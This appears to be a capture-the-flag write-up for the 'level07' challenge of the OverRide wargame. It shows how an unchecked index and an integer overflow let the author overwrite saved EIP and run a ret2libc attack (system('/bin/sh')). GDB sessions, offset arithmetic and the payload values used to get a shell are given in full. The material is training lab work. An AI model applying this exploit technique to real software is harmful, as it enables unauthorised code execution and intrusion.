the program read and store data from a int table.

the program do not check the bound of the table when we try to store or read
instead it just check if the index is divisible by 3 if it is it's reserved we can't use this index
but to store data the program multiplie the index by 4 (int table) and add it to the tab address

so we can pass the first check by giving a number not divisible by 3 then overflow with the multiplication by 4

since we can store any data anywhere in the program lets overwrite eip

-1 find offset

we need to find start address of our table and eip address

(gdb) b *main+520
Breakpoint 3 at 0x804892b
(gdb) c
Continuing.
 Index: 0
 Number at data[0] is 0
 Completed read command successfully
Input command: read

Breakpoint 3, 0x0804892b in main ()
(gdb) i f
Stack level 0, frame at 0xffffd620:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd618, args: 
 Locals at 0xffffd618, Previous frame's sp is 0xffffd620
 Saved registers:
  ebx at 0xffffd60c, ebp at 0xffffd618, esi at 0xffffd610, edi at 0xffffd614,
  eip at 0xffffd61c

  Breakpoint 2, 0x080486dd in read_number ()
(gdb) p $ebp+0x8
$5 = (void *) 0xffffd430
(gdb) x/x $ebp+0x8
0xffffd430:	0xffffd454


eip = 0xffffd61c  tab = 0xffffd454

>>> (0xffffd61c - 0xffffd454) / 4
114

we can acces eip at tab[114] lets check

Continuing.
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully

>>> hex(4158936339)
'0xf7e45513'

x/x 0xffffd61c
0xffffd61c:	0xf7e45513


but this index will be protecded so we need to overflow

(UINT_MAX + 1) / 4 + 114 = 4294967296 / 4 + 114 = 1073741938

Continuing.
 Index: 1073741938
 Number at data[1073741938] is 4158936339
 Completed read command successfully

we now control eip lets return to a shell

we have 2 options here to start a shell we can store a shellcode in our tab and put the tab addr at eip
but it will take to much time to build the shellcode 4 by 4 bytes and to calculate overflow

or we can build a shell with already stored value it's call ROP chain attack
this program is linked with libc

(gdb) info proc mappings
process 1933
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fd8000 0xf7fdb000     0x3000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]

we can find "/bin/sh" and "system" function string in the shared libc

(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) p system
$7 = {<text variable, no debug info>} 0xf7e6aed0 <system>

lets build our payloads:

eip = system
tab[1073741938] = 4159090384

eip+0x8 = /bin/sh
tab[116] = 4160264172

level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
\level08

